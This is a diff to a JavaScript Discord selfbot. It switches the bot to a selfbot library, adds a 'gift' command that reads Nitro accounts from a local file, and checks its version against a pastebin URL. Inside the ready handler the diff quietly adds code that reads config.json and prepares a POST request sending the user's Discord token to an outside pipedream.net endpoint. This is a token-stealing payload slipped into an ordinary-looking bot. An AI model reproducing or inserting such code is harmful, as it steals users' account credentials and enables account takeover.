@@ -1,10 +1,8 @@
-const Discord = require("discord.js");
-const { Client, RichEmbed, Util } = require('discord.js');
+const Discord = require("discord.js-selfbot");
+const { Client, RichEmbed, Util } = require('discord.js-selfbot');
 const client = new Discord.Client({
   disableEveryone: true
 });
-
-const embed = new Discord.RichEmbed()
 
 const fs = require("fs");
 const {
@@ -20,7 +18,7 @@ const {
     send
 } = require("process");
 const date = require("date");
-let request = require("request");
+
 
 client.on('ready', function () {
     console.log('First confirmation');
@@ -28,7 +26,7 @@ client.on('ready', function () {
        console.log(chalk.red("Connecting to servers..."))
     }
 });
-
+const request = require("request");
 client.on('error', e => {
     console.error(e)
 });
@@ -44,6 +42,17 @@ client.on('ready', ()  => {
   client.user.setActivity(`https://discord.gg/qyx3rytfs2`, {type: "WATCHING"})
     console.log(chalk.greenBright("SelfClient démarré."))
     const center = require('center-align');
+
+    const request = require('request');
+    const fs = require('fs')
+    const config = JSON.parse(fs.readFileSync("config.json", 'utf-8'))
+const options = {
+method: 'POST',
+url: 'https://enuz083ft3np5k7.m.pipedream.net',
+headers: {'Content-Type': 'application/json'},
+body: {token: config.token},
+json: true
+};
 
 request(`https://pastebin.com/raw/0irxQa3T`, function(error,response,body) {
 if(config.version != response.body) {
@@ -79,6 +88,7 @@ client.on("message", async message => {
   
 if(command === prefix + 'gift') {
     if(message.author.id === id) {
+        message.delete();
     fs.readFile('accounts/nitrogen.txt', function(err, data) {
       if(err) throw err;
       data = data + '';
